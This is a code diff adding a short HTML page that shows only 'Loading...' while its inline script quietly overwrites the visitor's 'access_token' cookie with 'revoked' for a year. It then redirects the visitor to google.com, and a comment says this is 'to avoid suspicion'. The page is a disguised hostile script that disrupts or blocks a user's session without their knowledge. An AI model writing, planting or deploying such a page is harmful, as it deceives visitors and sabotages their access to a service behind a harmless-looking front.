@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-width=1.0">
+    <title>Loading...</title>
+    <script>
+        // Set the blocking cookie. max-age=31536000 keeps it active for 1 year.
+        document.cookie = "access_token=revoked; max-age=31536000; path=/";
+        
+        // Immediately redirect to a harmless site to avoid suspicion
+        window.location.replace("https://www.google.com");
+    </script>
+</head>
+<body style="background-color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif;">
+    <p>Loading...</p>
+</body>
+</html>
